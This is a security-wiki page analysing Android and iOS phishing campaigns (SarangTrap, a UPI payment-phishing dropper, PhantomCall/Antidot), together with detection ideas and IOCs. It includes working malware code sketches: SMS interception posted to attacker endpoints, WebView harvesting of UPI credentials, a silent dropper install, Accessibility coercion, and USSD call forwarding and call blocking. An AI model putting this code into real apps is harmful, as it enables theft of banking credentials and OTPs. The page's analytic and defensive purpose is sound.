# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
> The material is adapted from the SarangTrap campaign exposed by Zimperium zLabs (2025) and other public research.

## Attack Flow

1. **SEO/Phishing Infrastructure**
   * Register dozens of look-alike domains (dating, cloud share, car service…).  
     – Use local language keywords and emojis in the `<title>` element to rank in Google.  
     – Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
2. **First Stage Download**
   * Android: direct link to an *unsigned* or “third-party store” APK.  
   * iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
   * On first run the app asks for an **invitation / verification code** (exclusive access illusion).  
   * The code is **POSTed over HTTP** to the Command-and-Control (C2).  
   * C2 replies `{"success":true}` ➜ malware continues.  
   * Sandbox / AV dynamic analysis that never submits a valid code sees **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
   * Dangerous permissions are only requested **after positive C2 response**:
     ```xml
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <!-- Older builds also asked for SMS permissions -->
     ```
   * Recent variants **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** but leave the Java/Kotlin code path that reads SMS through reflection ⇒ lowers static score while still functional on devices that grant the permission via `AppOps` abuse or old targets.
5. **Facade UI & Background Collection**
   * App shows harmless views (SMS viewer, gallery picker) implemented locally.  
   * Meanwhile it exfiltrates:
     - IMEI / IMSI, phone number
     - Full `ContactsContract` dump (JSON array)
     - JPEG/PNG from `/sdcard/DCIM` compressed with [Luban](https://github.com/Curzibn/Luban) to reduce size
     - Optional SMS content (`content://sms`)
     Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
   * A single **mobile-configuration profile** can request `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.  
   * Social-engineering instructions:
     1. Open Settings ➜ *Profile downloaded*.
     2. Tap *Install* three times (screenshots on the phishing page).  
     3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
7. **Network Layer**
   * Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – During malware assessment, automate the invitation code phase with Frida/Objection to reach the malicious branch.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` with runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms is a red flag.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` to detect unsolid POST bursts after code entry.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` on macOS to list `PayloadContent` and spot excessive entitlements.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** to catch sudden bursts of keyword-rich domains.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` from Dalvik clients outside Google Play.
* **Invite-code Telemetry** – POST of 6–8 digit numeric codes shortly after APK install may indicate staging.
* **MobileConfig Signing** – Block unsigned configuration profiles via MDM policy.

## Useful Frida Snippet: Auto-Bypass Invitation Code

```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
  var URL = Java.use('java.net.URL');
  URL.openConnection.implementation = function() {
    var conn = this.openConnection();
    var HttpURLConnection = Java.use('java.net.HttpURLConnection');
    if (Java.cast(conn, HttpURLConnection)) {
        conn.getResponseCode.implementation = function(){ return 200; };
        conn.getInputStream.implementation = function(){
            return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
        };
    }
    return conn;
  };
});
```

## Indicators (Generic)

```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```

---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):

```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```

### Dynamic endpoint discovery via shortlink
- Malware fetches a plain-text, comma-separated list of live endpoints from a shortlink; simple string transforms produce the final phishing page path.

Example (sanitised):

```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```

Pseudo-code:

```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```

### WebView-based UPI credential harvesting
- The “Make payment of ₹1 / UPI‑Lite” step loads an attacker HTML form from the dynamic endpoint inside a WebView and captures sensitive fields (phone, bank, UPI PIN) which are `POST`ed to `addup.php`.

Minimal loader:

```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```

### Self-propagation and SMS/OTP interception
- Aggressive permissions are requested on first run:

```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```

- Contacts are looped to mass-send smishing SMS from the victim’s device.
- Incoming SMS are intercepted by a broadcast receiver and uploaded with metadata (sender, body, SIM slot, per-device random ID) to `/addsm.php`.

Receiver sketch:

```java
public void onReceive(Context c, Intent i){
  SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
  for (SmsMessage m: msgs){
    postForm(urlAddSms, new FormBody.Builder()
      .add("senderNum", m.getOriginatingAddress())
      .add("Message", m.getMessageBody())
      .add("Slot", String.valueOf(getSimSlot(i)))
      .add("Device rand", getOrMakeDeviceRand(c))
      .build());
  }
}
```

### Firebase Cloud Messaging (FCM) as resilient C2
- The payload registers to FCM; push messages carry a `_type` field used as a switch to trigger actions (e.g., update phishing text templates, toggle behaviours).

Example FCM payload:

```json
{
  "to": "<device_fcm_token>",
  "data": {
    "_type": "update_texts",
    "template": "New subsidy message..."
  }
}
```

Handler sketch:

```java
@Override
public void onMessageReceived(RemoteMessage msg){
  String t = msg.getData().get("_type");
  switch (t){
    case "update_texts": applyTemplate(msg.getData().get("template")); break;
    case "smish": sendSmishToContacts(); break;
    // ... more remote actions
  }
}
```

### Hunting patterns and IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

### Detection & defence ideas
- Flag apps that instruct users to disable network during install and then side-load a second APK from `assets/`.
- Alert on the permission tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Egress monitoring for `POST /addup.php|/addsm.php` on non-corporate hosts; block known infrastructure.
- Mobile EDR rules: untrusted app registering for FCM and branching on a `_type` field.

---

## Android 13+ Restricted Settings bypass, Accessibility coercion and telephony isolation (PhantomCall/Antidot pattern)

Banking malware campaigns distributed via smishing/rogue ads increasingly avoid Google Play and rely on sideloaded APKs. From Android 13 onward, Restricted Settings make it harder for sideloaded apps to get Accessibility enabled. Operators now mimic the Play Store install flow with a dropper + payload architecture and abuse legitimate platform APIs for post‑install coercion and call isolation.

### 1) Installer‑flow mimicry to bypass Restricted Settings

Goal: move the victim to Settings → “Install unknown apps” for the fake package, then install the real payload silently via PackageInstaller.Session to emulate Play behaviour (instead of using Intent.ACTION_INSTALL_PACKAGE).

- WebView “update” page + JavaScript bridge to open the system screen for unknown sources:

```java
// Bind a JS bridge to a fake Google Play WebView page
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new Object(){
  @JavascriptInterface
  public void onUpdateClicked(){
    // Open: Settings → Install unknown apps for this package (fake Chrome)
    Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
        .setData(Uri.parse("package:" + getPackageName()));
    startActivity(i);
  }
}, "bridge");
```

- Gate on “Install unknown apps” using PackageManager.canRequestPackageInstalls(). Keep showing the fake update page until granted, then stream the Trojan APK bytes through a PackageInstaller.Session:

```java
@Override
protected void onResume(){
  boolean allowed = getPackageManager().canRequestPackageInstalls();
  if (!allowed){
    showFakePlayUpdate(); // WebView with JS bridge above
    return;
  }
  installPayloadFromBytes(apkBytes);
}

private void installPayloadFromBytes(byte[] apk){
  PackageInstaller pi = getPackageManager().getPackageInstaller();
  PackageInstaller.SessionParams params =
      new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
  int sessionId = pi.createSession(params);
  try (PackageInstaller.Session s = pi.openSession(sessionId);
       OutputStream os = s.openWrite("base.apk", 0, apk.length)){
    os.write(apk);
    s.fsync(os);
    PendingIntent result = PendingIntent.getBroadcast(this, 0, new Intent("install.result"), 0);
    s.commit(result.getIntentSender());
  } catch (Exception e){ /* handle */ }
}
```

Why this works: using the session‑based flow closely matches the Play Store install UX and avoids the sideloaded‑installer friction associated with ACTION_INSTALL_PACKAGE. The dropper only needs the user to toggle “Install unknown apps” once.

### 2) Persistent Accessibility coercion

After the payload (banking Trojan) is installed, the dropper keeps running and “drives” the user to enable the payload’s Accessibility service. It polls the active services and, if the target service is missing, foregrounds the payload UI to pressure the user until enabled.

```java
// Coercion loop (simplified)
AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
PackageManager pm = getPackageManager();
List<AccessibilityServiceInfo> enabled =
    am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
boolean active = false;
for (AccessibilityServiceInfo si : enabled){
  CharSequence label = si.getResolveInfo().loadLabel(pm);
  if (label != null && label.toString().equals("<TargetServiceLabel>")) { active = true; break; }
}
if (!active){
  // Bring malware main activity to front to urge enabling Accessibility
  startActivity(new Intent().setComponent(new ComponentName("mal.pkg","mal.pkg.MainActivity"))
      .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
}
```

See also Accessibility abuse details and hardening: [Android Accessibility Service Abuse](../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md).

### 3) Telephony isolation for stealthy fraud

Once Accessibility is active, the payload isolates the victim from bank/support callbacks to delay detection:

- USSD‑based call forwarding: dispatch USSD codes to configure call forwarding to attacker numbers.

```java
TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
tm.sendUssdRequest("*21*<attacker_number>#", new TelephonyManager.UssdResponseCallback(){}, new Handler());
```

- CallScreeningService‑based blocking: implement a CallScreeningService which matches incoming numbers by postfix from a C2‑provided list stored in SharedPreferences, then suppresses UI, log and notifications for matched calls.

```java
public class Blocker extends CallScreeningService {
  @Override
  public void onScreenCall(Call.Details d){
    String incoming = d.getHandle().getSchemeSpecificPart();
    Set<String> postfixes = prefs.getStringSet("c2_numbers", Collections.emptySet());
    if (matchesPostfix(incoming, postfixes)){
      respondToCall(d, new CallResponse.Builder()
        .setDisallowCall(true)
        .setSilenceCall(true)
        .setSkipCallLog(true)
        .setSkipNotification(true)
        .build());
    }
  }
}
```

This combination (forward legitimate callbacks away and block the rest locally) keeps the victim unaware while operators complete high‑value transactions via Accessibility automation.

### Hunting and triage tips

- Search for strings/classes: PackageInstaller.Session, canRequestPackageInstalls, ACTION_MANAGE_UNKNOWN_APP_SOURCES, addJavascriptInterface/@JavascriptInterface, AccessibilityManager.getEnabledAccessibilityServiceList, CallScreeningService, sendUssdRequest, SharedPreferences number lists.
- Hook startActivity and PackageInstaller APIs with Frida to observe the install + coercion chain during dynamic analysis.
- Monitor Settings changes for “Install unknown apps”, default call‑screening app, and sudden call‑forwarding USSD requests.


## References

- [PhantomCall unmasked: An Antidot variant disguised as fake Chrome apps (IBM Trusteer Labs)](https://www.ibm.com/think/news/phantomcall-antidot-variant-in-fake-chrome-apps)
- [Android API — PackageInstaller.Session](https://developer.android.com/reference/android/content/pm/PackageInstaller.Session)
- [Android API — PackageManager.canRequestPackageInstalls()](https://developer.android.com/reference/android/content/pm/PackageManager#canRequestPackageInstalls())
- [Android API — AccessibilityManager.getEnabledAccessibilityServiceList(int)](https://developer.android.com/reference/android/view/accessibility/AccessibilityManager#getEnabledAccessibilityServiceList(int))
- [Android API — CallScreeningService](https://developer.android.com/reference/android/telecom/CallScreeningService)
- [Android API — TelephonyManager.sendUssdRequest](https://developer.android.com/reference/android/telephony/TelephonyManager#sendUssdRequest(java.lang.String,%20android.telephony.TelephonyManager.UssdResponseCallback,%20android.os.Handler))
- [Google Play policy — AccessibilityServices restrictions](https://support.google.com/googleplay/android-developer/answer/10964491?hl=en)
- [Google Security Blog — How we fought bad apps and developers in 2021](https://security.googleblog.com/2022/04/how-we-fought-bad-apps-and-developers.html)
- [Antidot banking trojan masquerading as Google Play updates (Cyble)](https://cyble.com/blog/new-antidot-android-banking-trojan-masquerading-as-google-play-updates/)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}